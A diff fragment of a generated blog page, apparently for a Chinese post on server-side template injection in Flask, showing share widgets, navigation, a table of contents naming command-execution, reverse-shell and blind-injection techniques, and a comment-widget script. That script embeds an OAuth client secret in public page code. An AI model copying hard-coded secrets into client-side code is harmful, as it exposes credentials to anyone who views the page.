+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=https://zhouypeng.github.io/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5-SSTI/" alt="微信分享二维码"> -->
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/pwn%E6%A0%88%E6%BA%A2%E5%87%BA-ret2shellcode/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">pwn栈溢出-ret2shellcode</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">SSTI漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A8%A1%E5%9D%97%E5%BC%95%E6%93%8E"><span class="toc-number">1.1.</span> <span class="toc-text">模块引擎</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSTI%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">SSTI漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">具体漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Python-Flask-SSTI"><span class="toc-number">2.1.</span> <span class="toc-text">Python_Flask_SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#python-%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB%E5%92%8C%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">python 继承关系和魔术方法</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">继承关系</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">魔术方法</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#SSTI%E5%B8%B8%E7%94%A8%E7%9A%84%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-number">2.1.2.</span> <span class="toc-text">SSTI常用的注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">文件读取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">内建函数eval执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">os模块执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.4.</span> <span class="toc-text">importlib类执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.5.</span> <span class="toc-text">linecache函数执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.1.2.6.</span> <span class="toc-text">subprocess.Popen类执行命令</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%A4%A7%E6%8B%AC%E5%8F%B7"><span class="toc-number">2.1.3.</span> <span class="toc-text">绕过过滤双大括号</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BESSTI"><span class="toc-number">2.1.4.</span> <span class="toc-text">无回显SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.1.4.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.4.2.</span> <span class="toc-text">带外注入</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%BA%AF%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.1.4.3.</span> <span class="toc-text">纯盲注</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A2%AD%E5%93%88%E5%B7%A5%E5%85%B7"><span class="toc-number">3.</span> <span class="toc-text">梭哈工具</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
+        </div>
+        
+    </div>
+</aside>
+
+
+
+
+
+
+
+
+
+
+
+  
+  <div id="gitment-ctn"></div>
+  
+    <!-- 中文 -->
+    <link rel="stylesheet" href="/lib/gitment.css">
+    <script src="/lib/gitment.js"></script>
+  
+  <script>
+    <!-- id: "模块注入-SSTI" -->
+    var gitment = new Gitment({
+      id: "20240727160218",
+      owner: 'zhouypeng',
+      repo: 'zhouypeng.github.io',
+      oauth: {
+        client_id: 'd3e8ed4ef63a952d0e7e',
+        client_secret: '219186323680e3b43d7d83f04f13d92793c37e34',
+      },
+    })
+    gitment.render('gitment-ctn')
+  </script>
+
+
+  
 
 
           </div>
@@ -342,9 +612,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
